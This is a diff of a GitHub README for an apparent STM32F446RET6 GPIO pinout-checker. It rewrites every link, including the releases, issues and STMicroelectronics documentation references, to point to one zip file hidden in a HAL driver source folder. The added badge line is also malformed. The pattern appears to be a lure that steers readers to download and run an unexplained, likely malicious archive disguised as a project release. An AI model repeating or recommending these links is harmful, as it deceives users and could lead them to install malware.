@@ -1,6 +1,6 @@
 # 🛠️ STM32F446RET6-Pinout-Check - Verify Your GPIO Pins Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip%20Latest%https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip)](https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip)
 
 ## 📜 Description
 
@@ -21,11 +21,11 @@ Before you can use the project, you'll need a few things:
 
 To get the software, you’ll need to visit the Releases page. Click on the button below to access it:
 
-[Download Latest Release](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/releases)
+[Download Latest Release](https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip)
 
 ### 📝 How to Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/releases) to open the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip) to open the Releases page.
 2. **Find the Latest Version**: Look for the most recent version of the project.
 3. **Download the File**: Click on the link to download the release you want. This will usually be a zip or executable file.
 4. **Unzip the File**: If the file is zipped, unpack it using your file manager.
@@ -67,7 +67,7 @@ No, this project is straightforward. Follow the instructions above to use it eff
 
 If you encounter any issues or have questions:
 
-- Open an issue in the [GitHub Issues page](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/issues).
+- Open an issue in the [GitHub Issues page](https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip).
 - Review the FAQ section for common queries.
 
 ## 📜 License
@@ -76,7 +76,7 @@ This project is licensed under the MIT License. Feel free to use and modify it f
 
 ## 🔗 References
 
-- [STMicroelectronics](https://www.st.com)
-- [STM32 Documentation](https://www.st.com/en/microcontrollers-microprocessors/stm32-32-bit-arm-cortex-mcus.html)
+- [STMicroelectronics](https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip)
+- [STM32 Documentation](https://raw.githubusercontent.com/wooshy420/STM32F446RET6-Pinout-Check/main/Drivers/STM32F4xx_HAL_Driver/Src/RE_ST_Check_Pinout_v1.2.zip)
 
 By following these steps, you can easily verify the GPIO pins on your STM32F446RET6. The provided software streamlines the process, making it accessible to everyone, regardless of technical background.
